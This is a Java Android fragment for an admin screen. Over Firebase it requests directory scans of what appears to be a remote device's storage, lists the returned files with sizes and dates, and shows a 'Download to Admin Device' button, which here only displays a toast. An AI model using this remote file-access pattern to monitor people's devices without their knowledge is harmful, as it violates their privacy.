package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Stack;

public class AdminFileStructureFragment extends Fragment {

    private static RecyclerView recyclerView;
    private static TextView titleView;
    private static TextView emptyText;
    private static ProgressBar loader;
    private static ImageView backButton;
    private static FileAdapter adapter;
    
    private String currentPath = "";
    private final Stack<String> pathStack = new Stack<>();

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_generic_list, container, false);
        recyclerView = view.findViewById(R.id.generic_list_rv);
        titleView = view.findViewById(R.id.generic_list_title);
        emptyText = view.findViewById(R.id.generic_list_empty_text);
        loader = view.findViewById(R.id.generic_list_loader);
        backButton = view.findViewById(R.id.generic_list_back_button);
        
        titleView.setText("🗂 Root Storage");
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        adapter = new FileAdapter(this);
        recyclerView.setAdapter(adapter);

        backButton.setOnClickListener(v -> navigateBack());

        // Always request root scan on fragment entry
        setLoading(true);
        FirebaseUtils.requestRemoteDirectoryScan("");
        FirebaseUtils.getRemoteFileStructure();

        return view;
    }

    public static void displayFileStructure(Activity activity, List<Map<String, Object>> files) {
        setLoading(false);
        if (recyclerView == null || emptyText == null || adapter == null) return;
        
        if (files == null || files.isEmpty()) {
            emptyText.setVisibility(View.VISIBLE);
            recyclerView.setVisibility(View.GONE);
        } else {
            emptyText.setVisibility(View.GONE);
            recyclerView.setVisibility(View.VISIBLE);

            // Sort: Directories first, then alphabetically
            files.sort((a, b) -> {
                Object aIsDir = a.get("isDir");
                Object bIsDir = b.get("isDir");
                boolean aDir = aIsDir instanceof Boolean && (boolean) aIsDir;
                boolean bDir = bIsDir instanceof Boolean && (boolean) bIsDir;
                if (aDir != bDir) return aDir ? -1 : 1;
                return ((String) a.getOrDefault("name", "")).compareToIgnoreCase((String) b.getOrDefault("name", ""));
            });
            adapter.setData(files);
        }
    }

    private void onFileClicked(Map<String, Object> fileInfo) {
        Object isDirObj = fileInfo.get("isDir");
        boolean isDir = isDirObj instanceof Boolean && (boolean) isDirObj;
        String path = (String) fileInfo.get("path");
        String name = (String) fileInfo.get("name");

        if (isDir) {
            pathStack.push(currentPath);
            currentPath = path;
            titleView.setText("📁 " + name);
            setLoading(true);
            FirebaseUtils.requestRemoteDirectoryScan(path);
        } else {
            showFileDetailsDialog(fileInfo);
        }
    }

    private void navigateBack() {
        if (!pathStack.isEmpty()) {
            currentPath = pathStack.pop();
            String label = currentPath.isEmpty() ? "Root Storage" : currentPath.substring(currentPath.lastIndexOf("/") + 1);
            titleView.setText(currentPath.isEmpty() ? "🗂 " + label : "📁 " + label);
            setLoading(true);
            FirebaseUtils.requestRemoteDirectoryScan(currentPath);
        }
        updateNavigationUI();
    }

    private void updateNavigationUI() {
        if (backButton != null) {
            backButton.setVisibility(pathStack.isEmpty() ? View.GONE : View.VISIBLE);
        }
    }

    private static void setLoading(boolean active) {
        if (loader != null) loader.setVisibility(active ? View.VISIBLE : View.GONE);
    }

    private void showFileDetailsDialog(Map<String, Object> info) {
        View dialogView = LayoutInflater.from(getContext()).inflate(R.layout.dialog_remote_trigger_config, null);
        AlertDialog dialog = new AlertDialog.Builder(getContext()).setView(dialogView).create();
        if (dialog.getWindow() != null) dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        TextView title = dialogView.findViewById(R.id.dialog_title);
        title.setText("File Properties");

        LinearLayout container = (LinearLayout) title.getParent();
        container.removeAllViews();
        container.addView(title);

        addInfoRow(container, "Name", (String) info.get("name"));
        addInfoRow(container, "Extension", (String) info.get("ext"));
        
        Object sizeObj = info.get("size");
        long size = sizeObj instanceof Number ? ((Number) sizeObj).longValue() : 0;
        addInfoRow(container, "Size", formatSize(size));
        
        Object modifiedObj = info.get("lastModified");
        long modified = modifiedObj instanceof Number ? ((Number) modifiedObj).longValue() : 0;
        addInfoRow(container, "Last Modified", formatDate(modified));
        
        addInfoRow(container, "Full Path", (String) info.get("path"));

        Button downloadBtn = new Button(getContext());
        downloadBtn.setText("Download to Admin Device");
        downloadBtn.setBackgroundResource(R.drawable.button_action);
        downloadBtn.setTextColor(Color.WHITE);
        downloadBtn.setAllCaps(false);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2);
        lp.setMargins(0, 40, 0, 0);
        downloadBtn.setLayoutParams(lp);
        downloadBtn.setOnClickListener(v -> {
            Toast.makeText(getContext(), "Streaming requested for: " + info.get("name"), Toast.LENGTH_LONG).show();
            dialog.dismiss();
        });
        container.addView(downloadBtn);

        dialog.show();
    }

    private void addInfoRow(LinearLayout container, String label, String value) {
        TextView tv = new TextView(getContext());
        tv.setText(label + ": " + (value != null ? value : "N/A"));
        tv.setTextColor(Color.WHITE);
        tv.setTextSize(13f);
        tv.setPadding(0, 12, 0, 12);
        container.addView(tv);
    }

    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp-1) + "";
        return String.format(Locale.ENGLISH, "%.1f %sB", bytes / Math.pow(1024, exp), pre);
    }

    private String formatDate(long time) {
        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(time));
    }

    private static class FileAdapter extends RecyclerView.Adapter<FileAdapter.ViewHolder> {
        private List<Map<String, Object>> files = new ArrayList<>();
        private final AdminFileStructureFragment fragment;

        public FileAdapter(AdminFileStructureFragment fragment) {
            this.fragment = fragment;
        }

        public void setData(List<Map<String, Object>> data) {
            this.files = data;
            notifyDataSetChanged();
        }

        @NonNull
        @Override
        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View v = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_file_explorer, parent, false);
            return new ViewHolder(v);
        }

        @Override
        public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            Map<String, Object> info = files.get(position);
            Object isDirObj = info.get("isDir");
            boolean isDir = isDirObj instanceof Boolean && (boolean) isDirObj;
            holder.name.setText((String) info.get("name"));
            holder.icon.setText(isDir ? "📁" : getEmojiForExt((String) info.get("ext")));
            
            Object sizeObj = info.get("size");
            long size = sizeObj instanceof Number ? ((Number) sizeObj).longValue() : 0;
            holder.details.setText(isDir ? "Directory" : formatSize(size));
            holder.itemView.setOnClickListener(v -> fragment.onFileClicked(info));
        }

        private String getEmojiForExt(String ext) {
            if (ext == null) return "📄";
            switch (ext.toLowerCase()) {
                case "pdf": return "📕";
                case "jpg": case "png": case "jpeg": case "webp": return "🖼";
                case "mp4": case "mkv": case "mov": return "🎬";
                case "mp3": case "wav": case "m4a": return "🎵";
                case "zip": case "rar": case "7z": return "📦";
                case "apk": return "🤖";
                default: return "📄";
            }
        }

        @Override
        public int getItemCount() { return files.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            TextView name, details, icon;
            ViewHolder(View v) {
                super(v);
                name = v.findViewById(R.id.file_name);
                details = v.findViewById(R.id.file_details);
                icon = v.findViewById(R.id.file_icon);
            }
        }
    }
}
